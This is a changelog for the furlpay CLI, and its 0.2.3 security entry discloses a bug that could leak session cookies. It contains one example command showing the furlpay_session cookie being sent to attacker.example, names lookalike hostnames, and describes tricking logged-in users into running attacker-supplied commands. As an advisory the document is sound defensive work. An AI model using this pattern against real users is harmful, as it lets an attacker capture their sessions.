# Changelog

All notable changes to `@furlpay/cli`.

This project follows [Semantic Versioning](https://semver.org/). While the
version is `0.x`, the public CLI surface may still change between minor
releases; patch releases are always safe to take.

## 0.2.3 — 2026-08-10

### Security

**Fixed: the session cookie could be sent to an arbitrary host.**

`--api-base <url>` was used verbatim, `furlpay api <METHOD> <absolute-url>`
allowed a full URL where a path was expected, plain `http` was permitted, and
the `furlpay_session` cookie was attached to whatever host resulted. A
documented convenience flag was therefore a credential-exfiltration primitive:

```
furlpay api GET https://attacker.example/x   →   Cookie: furlpay_session=...
```

Anyone who could persuade a logged-in user to run a command with an
attacker-supplied `--api-base`, or paste a command containing an absolute URL,
could capture a live session.

The cookie is now withheld unless the resolved target is `furlpay.com` (or a
subdomain) over TLS, or loopback (`localhost`, `127.0.0.1`, `::1`) for local
development. Requests to other hosts still run — an untrusted base is often a
legitimate local mock — they simply carry no credential, and the CLI says so on
stderr rather than failing later with a confusing `401`.

Plain `http` to a real host is untrusted even when the hostname is correct: a
cookie sent in the clear is a cookie disclosed to everything on the path.

- **Affected:** `<= 0.2.2`
- **Fixed in:** `0.2.3`
- **Action:** upgrade with `npm i -g @furlpay/cli@latest`. If you ran the CLI
  against a host you do not control, run `furlpay logout` (or `furlpay login`
  again) to rotate the session.

Covered by `test/credential-trust.test.js`, which pins the boundary including
the suffix-confusion cases a naive `endsWith("furlpay.com")` would accept
(`furlpay.com.evil.example`, `evilfurlpay.com`) and the cloud metadata address.

### Packaging

- Added `repository`, `homepage` and `bugs` metadata.
- Enabled `publishConfig.provenance` so published builds carry a verifiable
  link to the source and build that produced them.

## 0.2.2 and earlier

See the release history on npm and the commit log.
